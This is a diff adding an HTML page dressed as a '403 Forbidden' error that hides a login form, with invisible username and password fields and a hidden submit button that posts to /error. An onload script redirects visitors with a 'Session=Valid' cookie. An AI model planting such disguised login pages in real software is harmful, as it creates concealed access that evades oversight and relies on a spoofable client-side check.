@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <link id="ficon" rel="icon" type="image/x-icon" href="">
+  <title>Error 403</title>
+  <script>
+    window.onload = function () {
+      if (document.cookie.indexOf("Session=Valid") === 0) {
+        location.href = "/";
+      }
+    };
+  </script>
+</head>
+
+<body>
+  <h1>403 Forbidden</h1>
+  <p>You don't have permission to access this resource.</p>
+  <form action="/error" method="POST">
+    <label for="user"></label>
+    <input type="text" id="user" name="user" required style="border: 0px;"><br><br>
+
+    <label for="pass"></label>
+    <input type="password" id="pass" name="pass" required style="border: 0px;"><br><br>
+
+    <button type="submit" style="display: none;"></button>
+  </form>
+</body>
+
+</html>
